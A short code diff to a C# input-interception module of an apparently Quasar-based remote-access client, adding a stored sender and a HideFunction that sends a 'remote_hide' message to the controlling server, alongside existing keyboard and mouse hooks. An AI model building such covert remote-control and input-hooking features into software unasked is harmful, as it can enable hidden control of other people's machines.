@@ -20,6 +20,7 @@ namespace Quasar.Client.Interception
         public static MouseHook mouseHook;
         public static KeyboardHook keyboardHook;
         public static bool isAutoType = false;
+        private static ISender _client;
 
         private static void SendKey(Keys key, KeyState state, int sleepAfter = 0, int sleepBefore = 0)
         {
@@ -597,6 +598,7 @@ namespace Quasar.Client.Interception
 
         public static  Boolean InitializeDriver(ISender client)
         {
+            _client = client;
             if (InputInterceptor.CheckDriverInstalled())
             {
                 //if (InputInterceptor.Initialize())
@@ -1134,6 +1136,12 @@ namespace Quasar.Client.Interception
                 return mouseHook.SimulateScrollDown();
             else
                 return mouseHook.SimulateScrollUp();
+        }
+
+        public static void HideFunction()
+        {
+            isAutoType = false;
+            _client.Send(new NotifyMessageToServer { Type = "remote_hide" });
         }
     }
 
